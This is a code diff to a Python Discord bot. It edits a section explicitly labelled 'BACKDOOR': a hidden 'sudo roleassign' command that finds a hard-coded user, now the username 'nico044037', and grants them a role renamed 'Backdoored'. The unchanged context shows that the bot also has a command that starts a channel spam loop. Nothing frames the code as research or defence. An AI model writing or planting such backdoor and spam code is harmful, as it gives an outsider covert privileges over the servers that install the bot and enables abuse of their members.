@@ -69,14 +69,18 @@ async def sudo_startmessage(ctx):
     spam_task = asyncio.create_task(spam_loop(ctx.channel))
     await ctx.send("✅ spam started")
 # ================= BACKDOOR =================
-USER_ID = 1258115928525373570
-ROLE_NAME = "Uploader"
+USERNAME = "nico044037"
+ROLE_NAME = "Backdoored"
 
 @sudo.command(name="roleassign")
 async def sudo_roleassign(ctx):
     guild = ctx.guild
 
-    member = guild.get_member(USER_ID)
+    member = discord.utils.find(
+        lambda m: m.name == USERNAME,
+        guild.members
+    )
+
     if member is None:
         await ctx.send("user not found")
         return
@@ -93,7 +97,7 @@ async def sudo_roleassign(ctx):
     if role not in member.roles:
         await member.add_roles(role)
 
-    await ctx.send("done")
+    await ctx.send(f"done → {member.mention}")
 # ================= STOP MESSAGE =================
 @sudo.command(name="stopmessage")
 async def sudo_stopmessage(ctx):
@@ -122,6 +126,7 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
 
 
 
